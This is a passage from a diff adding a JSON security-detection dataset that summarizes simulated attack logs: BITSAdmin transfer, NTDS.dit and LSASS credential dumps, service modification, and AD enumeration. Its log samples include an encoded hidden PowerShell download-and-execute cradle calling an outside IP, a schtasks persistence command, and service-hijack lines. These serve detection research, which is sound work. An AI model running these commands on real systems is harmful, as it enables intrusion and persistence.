+    "A privileged service was called. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION5$ Account Domain: WORKGROUP Logon ID: 0x3E7 Service: Server: NT Local Security Authority / Authentication Service Service Name: LsaRegisterLogonProces",
+    "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 4696 Application Name: \\device\\harddiskvolume2\\windows\\system32\\svchost.exe Network Information: Source Address: :: Source Port: 61089",
+    "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 4696 Application Name: \\device\\harddiskvolume2\\windows\\system32\\svchost.exe Network Information: Direction: Outbound Source Address: ::1 Source ",
+    "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 4 Application Name: System Network Information: Direction: Inbound Source Address: ::1 Source Port: 61089 Destination Address: ::1 Destination P",
+    "A handle to an object was requested. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION5$ Account Domain: WORKGROUP Logon ID: 0x3E7 Object: Object Server: WS-Management Listener Object Type: Unknown Object Name: Unknown Handle ID: 0x0",
+    "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 4696 Application Name: \\device\\harddiskvolume2\\windows\\system32\\svchost.exe Network Information: Source Address: :: Source Port: 61090",
+    "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 4 Application Name: System Network Information: Direction: Inbound Source Address: ::1 Source Port: 61090 Destination Address: ::1 Destination P",
+    "A handle to an object was requested. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION5$ Account Domain: WORKGROUP Logon ID: 0x3E7 Object: Object Server: WS-Management Listener Object Type: Enumerate Object Name: http://schemas.micro",
+    "A security-enabled local group membership was enumerated. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION5$ Account Domain: WORKGROUP Logon ID: 0x3E7 Group: Security ID: S-1-5-32-544 Group Name: Administrators Group Domain: Builtin",
+    "A security-enabled local group membership was enumerated. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION5$ Account Domain: WORKGROUP Logon ID: 0x3E7 Group: Security ID: S-1-5-32-551 Group Name: Backup Operators Group Domain: Built",
+    "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 1928 Application Name: \\device\\harddiskvolume2\\windows\\system32\\svchost.exe Network Information: Source Address: :: Source Port: 56356",
+    "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 1928 Application Name: \\device\\harddiskvolume2\\windows\\system32\\svchost.exe Network Information: Direction: Outbound Source Address: 192.168.2.5",
+    "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 4696 Application Name: \\device\\harddiskvolume2\\windows\\system32\\svchost.exe Network Information: Source Address: 0.0.0.0 Source Port: ",
+    "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 4696 Application Name: \\device\\harddiskvolume2\\windows\\system32\\svchost.exe Network Information: Direction: Outbound Source Address: 192.168.2.5",
+    "A process has exited. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Account Domain: WORKSTATION5 Logon ID: 0xC61D9 Process Information: Process ID: 0x242c Process Name: C:\\Windows\\System32\\bitsadmin.",
+    "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 3428 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\guestagent\\windowsazureguestage",
+    "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3428 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\guestagent\\windowsazureguestagent.exe Net",
+    "Process accessed: RuleName: - UtcTime: 2020-10-23 06:36:40.265 SourceProcessGUID: {39e4a257-f132-5f8b-1000-000000000700} SourceProcessId: 944 SourceThreadId: 1060 SourceImage: C:\\windows\\system32\\svchost.exe TargetProcessGUID: {39e4a257-f24",
+    "Process accessed: RuleName: - UtcTime: 2020-10-23 06:36:40.265 SourceProcessGUID: {39e4a257-f132-5f8b-1000-000000000700} SourceProcessId: 944 SourceThreadId: 1060 SourceImage: C:\\windows\\system32\\svchost.exe TargetProcessGUID: {39e4a257-79e",
+    "Process accessed: RuleName: - UtcTime: 2020-10-23 06:36:41.293 SourceProcessGUID: {39e4a257-f132-5f8b-1000-000000000700} SourceProcessId: 944 SourceThreadId: 1060 SourceImage: C:\\windows\\system32\\svchost.exe TargetProcessGUID: {39e4a257-f24",
+    "Process accessed: RuleName: - UtcTime: 2020-10-23 06:36:41.293 SourceProcessGUID: {39e4a257-f132-5f8b-1000-000000000700} SourceProcessId: 944 SourceThreadId: 1060 SourceImage: C:\\windows\\system32\\svchost.exe TargetProcessGUID: {39e4a257-79e",
+    "File created: RuleName: - UtcTime: 2020-10-23 06:36:41.780 ProcessGuid: {39e4a257-f133-5f8b-3100-000000000700} ProcessId: 1556 Image: C:\\windows\\system32\\svchost.exe TargetFilename: C:\\Windows\\Prefetch\\BACKGROUNDTASKHOST.EXE-A4F5A8B5.pf Cre",
+    "Registry object added or deleted: RuleName: - EventType: CreateKey UtcTime: 2020-10-23 06:36:42.265 ProcessGuid: {39e4a257-f132-5f8b-1000-000000000700} ProcessId: 944 Image: C:\\windows\\system32\\svchost.exe TargetObject: HKU\\S-1-5-21-3940915",
+    "Process accessed: RuleName: - UtcTime: 2020-10-23 06:36:42.296 SourceProcessGUID: {39e4a257-f132-5f8b-1000-000000000700} SourceProcessId: 944 SourceThreadId: 1060 SourceImage: C:\\windows\\system32\\svchost.exe TargetProcessGUID: {39e4a257-f24",
+    "Process accessed: RuleName: - UtcTime: 2020-10-23 06:36:42.296 SourceProcessGUID: {39e4a257-f132-5f8b-1000-000000000700} SourceProcessId: 944 SourceThreadId: 1060 SourceImage: C:\\windows\\system32\\svchost.exe TargetProcessGUID: {39e4a257-79e",
+    "Registry object added or deleted: RuleName: - EventType: CreateKey UtcTime: 2020-10-23 06:36:42.390 ProcessGuid: {39e4a257-f1b3-5f8b-a700-000000000700} ProcessId: 1072 Image: C:\\windows\\Explorer.EXE TargetObject: HKU\\S-1-5-21-3940915590-645",
+    "Registry value set: RuleName: - EventType: SetValue UtcTime: 2020-10-23 06:36:42.390 ProcessGuid: {39e4a257-f1b3-5f8b-a700-000000000700} ProcessId: 1072 Image: C:\\windows\\Explorer.EXE TargetObject: HKU\\S-1-5-21-3940915590-64593676-141400625",
+    "Process accessed: RuleName: - UtcTime: 2020-10-23 06:36:42.390 SourceProcessGUID: {39e4a257-f1b3-5f8b-a700-000000000700} SourceProcessId: 1072 SourceThreadId: 1388 SourceImage: C:\\windows\\Explorer.EXE TargetProcessGUID: {39e4a257-79ed-5f92-",
+    "Process accessed: RuleName: - UtcTime: 2020-10-23 06:36:42.390 SourceProcessGUID: {39e4a257-f132-5f8b-1000-000000000700} SourceProcessId: 944 SourceThreadId: 6324 SourceImage: C:\\windows\\system32\\svchost.exe TargetProcessGUID: {39e4a257-79e",
+    "[Sun Dec 04 04:47:44 2005] [error] mod_jk child workerEnv in error state 6",
+    "[Sun Dec 04 04:51:18 2005] [error] mod_jk child workerEnv in error state 6",
+    "[Sun Dec 04 04:51:55 2005] [error] mod_jk child workerEnv in error state 6",
+    "[Sun Dec 04 04:52:15 2005] [error] mod_jk child workerEnv in error state 6",
+    "[Sun Dec 04 04:52:15 2005] [error] mod_jk child workerEnv in error state 7",
+    "[Sun Dec 04 04:52:52 2005] [error] mod_jk child workerEnv in error state 7",
+    "[Sun Dec 04 04:52:52 2005] [error] mod_jk child workerEnv in error state 6",
+    "[Sun Dec 04 04:53:16 2005] [error] mod_jk child workerEnv in error state 7",
+    "[Sun Dec 04 04:53:16 2005] [error] mod_jk child workerEnv in error state 6",
+    "[Sun Dec 04 04:53:54 2005] [error] mod_jk child workerEnv in error state 7",
+    "[Sun Dec 04 04:54:18 2005] [error] mod_jk child workerEnv in error state 6",
+    "[Sun Dec 04 04:54:18 2005] [error] mod_jk child workerEnv in error state 7",
+    "[Sun Dec 04 04:54:20 2005] [error] mod_jk child workerEnv in error state 6",
+    "[Sun Dec 04 04:56:59 2005] [error] mod_jk child workerEnv in error state 6",
+    "[Sun Dec 04 04:57:00 2005] [error] mod_jk child workerEnv in error state 6",
+    "Event 4624: An account was successfully logged on",
+    "Event 4672/5379: Special privileges and credential access prompt (Mordor PID 8536)",
+    "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEA",
+    "Sysmon Event 11: FileCreate: invoice_scan_v8.exe in Temp",
+    "Sysmon Event 3: Network connection detected to 194.26.29.112:443",
+    "schtasks /create /tn \"WindowsTelemetryUpdate\" /tr \"C:\\Users\\truongdo\\AppData\\Local\\Temp\\invoice_scan_v8.exe\" /sc onlogon",
+    "Firewall block: multiple SYN dropped from 192.168.100.10 to 192.168.1.105 ports 445, 3389, 22",
+    "IDS Alert: Rapid probe payload detected on SMB 445 from 192.168.100.10"
+  ],
+  "network_indicators": [
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "5156",
+      "source_ip": "192.168.2.5",
+      "dest_ip": "239.255.255.250",
+      "dest_port": 1900,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "5156",
+      "source_ip": null,
+      "dest_ip": "239.255.255.250",
+      "dest_port": 1900,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "5158",
+      "source_ip": "::",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "5156",
+      "source_ip": null,
+      "dest_ip": "::1",
+      "dest_port": 5985,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "5156",
+      "source_ip": null,
+      "dest_ip": "::1",
+      "dest_port": 5985,
+      "process_name": "System"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "5156",
+      "source_ip": "192.168.2.5",
+      "dest_ip": "168.63.129.16",
+      "dest_port": 53,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "5158",
+      "source_ip": "0.0.0.0",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "5156",
+      "source_ip": "192.168.2.5",
+      "dest_ip": "151.101.208.133",
+      "dest_port": 443,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "5158",
+      "source_ip": "0.0.0.0",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "windowsazureguestagent.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "5156",
+      "source_ip": "192.168.2.5",
+      "dest_ip": "168.63.129.16",
+      "dest_port": 80,
+      "process_name": "windowsazureguestagent.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "3",
+      "source_ip": "192.168.2.5",
+      "dest_ip": "239.255.255.250",
+      "dest_port": 1900,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "3",
+      "source_ip": null,
+      "dest_ip": "239.255.255.250",
+      "dest_port": 1900,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "3",
+      "source_ip": "239.255.255.250",
+      "dest_ip": "127.0.0.1",
+      "dest_port": 61629,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "3",
+      "source_ip": "0:0:0:0:0:0:0:1",
+      "dest_ip": "0:0:0:0:0:0:0:1",
+      "dest_port": 5985,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "3",
+      "source_ip": "0:0:0:0:0:0:0:1",
+      "dest_ip": "0:0:0:0:0:0:0:1",
+      "dest_port": 5985,
+      "process_name": "System"
+    },
+    {
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "event_id": "3",
+      "source_ip": "192.168.2.5",
+      "dest_ip": "151.101.208.133",
+      "dest_port": 443,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": "2001:500:2::c",
+      "dest_port": 53,
+      "process_name": "dns.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": "2001:500:2d::d",
+      "dest_port": 53,
+      "process_name": "dns.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "192.168.1.4",
+      "dest_ip": "192.203.230.10",
+      "dest_port": 53,
+      "process_name": "dns.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5158",
+      "source_ip": "::",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "System"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_port": 445,
+      "process_name": "System"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "4624",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": null
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5140",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": null
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5145",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": null
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": "2001:500:2f::f",
+      "dest_port": 53,
+      "process_name": "dns.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "192.168.1.4",
+      "dest_ip": "192.112.36.4",
+      "dest_port": 53,
+      "process_name": "dns.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": "2001:503:ba3e::2:30",
+      "dest_port": 53,
+      "process_name": "dns.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "fe80::1:1",
+      "dest_ip": "ff02::1",
+      "dest_port": 134,
+      "process_name": "System"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5158",
+      "source_ip": "::",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": null,
+      "dest_ip": "::1",
+      "dest_port": 53,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": "2001:500:9f::42",
+      "dest_port": 53,
+      "process_name": "dns.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": null,
+      "dest_ip": "127.0.0.1",
+      "dest_port": 53,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": "2001:dc3::35",
+      "dest_port": 53,
+      "process_name": "dns.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": "2001:500:84::b",
+      "dest_port": 53,
+      "process_name": "dns.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": "2001:500:1::53",
+      "dest_port": 53,
+      "process_name": "dns.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": "ff02::16",
+      "dest_port": 0,
+      "process_name": "System"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "192.168.1.4",
+      "dest_ip": "224.0.0.22",
+      "dest_port": 0,
+      "process_name": "System"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5158",
+      "source_ip": "0.0.0.0",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "192.168.1.4",
+      "dest_ip": "224.0.0.251",
+      "dest_port": 5353,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "event_id": "5156",
+      "source_ip": "fe80::3b31:a8fa:5adc:7b9e",
+      "dest_ip": "ff02::fb",
+      "dest_port": 5353,
+      "process_name": "svchost.exe"
+    },
+    {
+      "scenario": "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)",
+      "event_id": "WebLog",
+      "source_ip": "222.166.160.184",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "webserver"
+    },
+    {
+      "scenario": "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)",
+      "event_id": "WebLog",
+      "source_ip": "63.13.186.196",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "webserver"
+    },
+    {
+      "scenario": "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)",
+      "event_id": "WebLog",
+      "source_ip": "147.31.138.75",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "webserver"
+    },
+    {
+      "scenario": "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)",
+      "event_id": "WebLog",
+      "source_ip": "207.203.80.15",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "webserver"
+    },
+    {
+      "scenario": "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)",
+      "event_id": "WebLog",
+      "source_ip": "218.76.139.20",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "webserver"
+    },
+    {
+      "scenario": "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)",
+      "event_id": "WebLog",
+      "source_ip": "24.147.151.74",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "webserver"
+    },
+    {
+      "scenario": "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)",
+      "event_id": "WebLog",
+      "source_ip": "211.141.93.88",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "webserver"
+    },
+    {
+      "scenario": "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)",
+      "event_id": "WebLog",
+      "source_ip": "216.127.124.16",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "webserver"
+    },
+    {
+      "scenario": "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)",
+      "event_id": "WebLog",
+      "source_ip": "208.51.151.210",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "webserver"
+    },
+    {
+      "scenario": "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)",
+      "event_id": "WebLog",
+      "source_ip": "65.68.235.27",
+      "dest_ip": null,
+      "dest_port": null,
+      "process_name": "webserver"
+    }
+  ],
+  "scenario_profiles": [
+    {
+      "scenario_name": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "source_file": "cmd_bitsadmin_download_psh_script_2020-10-2302365189.json",
+      "dataset_type": "mordor",
+      "total_events_analyzed": 424,
+      "suspicious_events_count": 381,
+      "dominant_event_ids": [
+        "7",
+        "10",
+        "12",
+        "4658",
+        "13",
+        "5156",
+        "4656",
+        "4703"
+      ],
+      "mitre_techniques": [
+        "T1197",
+        "T1105"
+      ],
+      "attack_category": "MALWARE",
+      "key_indicators": [
+        "svchost.exe",
+        "explorer.exe",
+        "bitsadmin.exe",
+        "lsass.exe",
+        "services.exe",
+        "system"
+      ],
+      "sample_commands": [
+        "The audit log was cleared. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Domain Name: WORKSTATION5 Logon ID: 0xC61D9",
+        "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\wardog\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+        "The handle to an object was closed. Subject : Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Account Domain: WORKSTATION5 Logon ID: 0xC61D9 Object: Object Server: Security Handle ID: 0x3d18 Process Information",
+        "A handle to an object was requested. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Account Domain: WORKSTATION5 Logon ID: 0xC61D9 Object: Object Server: Security Object Type: Key Object Name: \\REGIST",
+        "An attempt was made to access an object. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Account Domain: WORKSTATION5 Logon ID: 0xC61D9 Object: Object Server: Security Object Type: Key Object Name: \\RE"
+      ]
+    },
+    {
+      "scenario_name": "Credential Access / NTDS.dit Active Directory Dump",
+      "source_file": "cmd_dumping_ntds_dit_file_ntdsutil.json",
+      "dataset_type": "mordor",
+      "total_events_analyzed": 2000,
+      "suspicious_events_count": 2000,
+      "dominant_event_ids": [
+        "4658",
+        "4661",
+        "10",
+        "4799",
+        "5156",
+        "11",
+        "5158",
+        "412"
+      ],
+      "mitre_techniques": [
+        "T1003.003"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS",
+      "key_indicators": [
+        "lsass.exe",
+        "vboxservice.exe",
+        "taskhostw.exe",
+        "svchost.exe",
+        "dns.exe",
+        "ntdsutil.exe"
+      ],
+      "sample_commands": [
+        "NTDS (600,P,98) NTDSA: The database engine (10.00.20348.0000) is starting a new instance (0).",
+        "NTDS (600,R,98) NTDSA: The database engine is initiating recovery steps.",
+        "NTDS (600,R,98) NTDSA: The database [C:\\Windows\\NTDS\\ntds.dit] format version is being held back to 8920 (0x22d8) due to application parameter setting of 0x22D8 (8920). Current default engine version: 9360 (0x2490).",
+        "NTDS (600,R,98) NTDSA: The database engine has finished replaying logfile C:\\Windows\\NTDS\\edb00002.log. Processing Stats: [1] 0.801288 -0.379509 (265) CM -0.645574 (305) WT +J(CM:265, PgRf:575, Rd:0/265, Dy:26/205, Lg:10311853/93026) +M(C:1",
+        "NTDS (600,R,98) NTDSA: The database engine has finished replaying logfile C:\\Windows\\NTDS\\edb.log. Processing Stats: [1] 0.007164 -0.000276 (2) WT +J(CM:0, PgRf:176, Rd:0/0, Dy:4/360, Lg:571896/770) +M(C:0K, Fs:90, WS:352K # 352K, PF:0K # 8"
+      ]
+    },
+    {
+      "scenario_name": "Credential Access / LSASS Memory Dump via Syscalls",
+      "source_file": "cmd_lsass_memory_dumpert_syscalls_2020-10-1822561997.json",
+      "dataset_type": "mordor",
+      "total_events_analyzed": 118,
+      "suspicious_events_count": 115,
+      "dominant_event_ids": [
+        "10",
+        "13",
+        "7",
+        "4658",
+        "4663",
+        "4656",
+        "4690",
+        "12"
+      ],
+      "mitre_techniques": [
+        "T1003.001"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS",
+      "key_indicators": [
+        "explorer.exe",
+        "outflank-dumpert.exe",
+        "lsass.exe",
+        "svchost.exe",
+        "cmd.exe",
+        "windowsazureguestagent.exe"
+      ],
+      "sample_commands": [
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3428 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\guestagent\\windowsazureguestagent.exe Net",
+        "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 3428 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\guestagent\\windowsazureguestage",
+        "A process has exited. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Account Domain: WORKSTATION5 Logon ID: 0xC61D9 Process Information: Process ID: 0x1a74 Process Name: C:\\Users\\wardog\\Desktop\\Outfla",
+        "The handle to an object was closed. Subject : Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Account Domain: WORKSTATION5 Logon ID: 0xC61D9 Object: Object Server: Security Handle ID: 0xc4 Process Information: ",
+        "An attempt was made to access an object. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Account Domain: WORKSTATION5 Logon ID: 0xC61D9 Object: Object Server: Security Object Type: Process Object Name:"
+      ]
+    },
+    {
+      "scenario_name": "Privilege Escalation / Windows Service Modification",
+      "source_file": "cmd_service_mod_fax_2020-10-2120454410.json",
+      "dataset_type": "mordor",
+      "total_events_analyzed": 437,
+      "suspicious_events_count": 407,
+      "dominant_event_ids": [
+        "12",
+        "7",
+        "10",
+        "4658",
+        "4690",
+        "4656",
+        "13",
+        "4663"
+      ],
+      "mitre_techniques": [
+        "T1543.003"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION",
+      "key_indicators": [
+        "powershell.exe",
+        "explorer.exe",
+        "sc.exe",
+        "svchost.exe",
+        "services.exe",
+        "conhost.exe"
+      ],
+      "sample_commands": [
+        "The audit log was cleared. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Domain Name: WORKSTATION5 Logon ID: 0xC61D9",
+        "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\"",
+        "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 3428 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\guestagent\\windowsazureguestage",
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3428 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\guestagent\\windowsazureguestagent.exe Net",
+        "A handle to an object was requested. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION5$ Account Domain: WORKGROUP Logon ID: 0x3E7 Object: Object Server: Security Object Type: Key Object Name: \\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\C"
+      ]
+    },
+    {
+      "scenario_name": "Discovery / SharpView Active Directory Enumeration",
+      "source_file": "cmd_sharpview_pcre_net_2020-10-2920232423.json",
+      "dataset_type": "mordor",
+      "total_events_analyzed": 267,
+      "suspicious_events_count": 250,
+      "dominant_event_ids": [
+        "7",
+        "10",
+        "4658",
+        "13",
+        "4690",
+        "4656",
+        "12",
+        "4663"
+      ],
+      "mitre_techniques": [
+        "T1087.002",
+        "T1087",
+        "T1018",
+        "T1046",
+        "T1078.002"
+      ],
+      "attack_category": "RECONNAISSANCE",
+      "key_indicators": [
+        "sharpview.exe",
+        "svchost.exe",
+        "explorer.exe",
+        "lsass.exe",
+        "cmd.exe",
+        "csrss.exe"
+      ],
+      "sample_commands": [
+        "The audit log was cleared. Subject: Security ID: S-1-5-21-3140987116-517580383-2541594433-1104 Account Name: pgustavo Domain Name: THESHIRE Logon ID: 0x10276B",
+        "SharpView.exe Get-ObjectAcl -SamAccountName \"Domain Admins\"",
+        "The handle to an object was closed. Subject : Security ID: S-1-5-21-3140987116-517580383-2541594433-1104 Account Name: pgustavo Account Domain: THESHIRE Logon ID: 0x10276B Object: Object Server: Security Handle ID: 0x9fc Process Information",
+        "A handle to an object was requested. Subject: Security ID: S-1-5-21-3140987116-517580383-2541594433-1104 Account Name: pgustavo Account Domain: THESHIRE Logon ID: 0x10276B Object: Object Server: Security Object Type: Key Object Name: \\REGIS",
+        "The handle to an object was closed. Subject : Security ID: S-1-5-21-3140987116-517580383-2541594433-1104 Account Name: pgustavo Account Domain: THESHIRE Logon ID: 0x10276B Object: Object Server: Security Handle ID: 0xa4 Process Information:"
+      ]
+    },
+    {
+      "scenario_name": "Persistence / Logon Script Modification",
+      "source_file": "cmd_userinitmprlogonscript_batch_2020-10-1922471810.json",
